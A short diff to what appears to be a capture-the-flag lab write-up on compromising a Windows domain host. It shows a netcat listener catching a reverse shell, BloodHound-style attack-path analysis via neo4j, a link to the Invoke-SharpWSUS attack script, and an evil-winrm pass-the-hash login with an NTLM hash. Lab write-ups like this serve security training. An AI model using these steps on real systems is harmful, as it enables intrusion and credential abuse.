@@ -189,6 +189,14 @@ listening on [any] 1235 ...
 connect to [10.10.16.8] from (UNKNOWN) [10.129.57.67] 49802
 ```
 
+└─$ sudo neo4j console 
+
+Analyzing the Shortest Path to unconstrained data systems
+
+![image](https://user-images.githubusercontent.com/105310322/190872497-68e612ae-0c0a-4b73-a31b-734d86012adb.png)
+
+
+
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
 
 └──╼ [★]$ evil-winrm -i 10.129.56.140 -u sflowers -H 1fcdb1f6015dcb318cc77bb2bda14db5
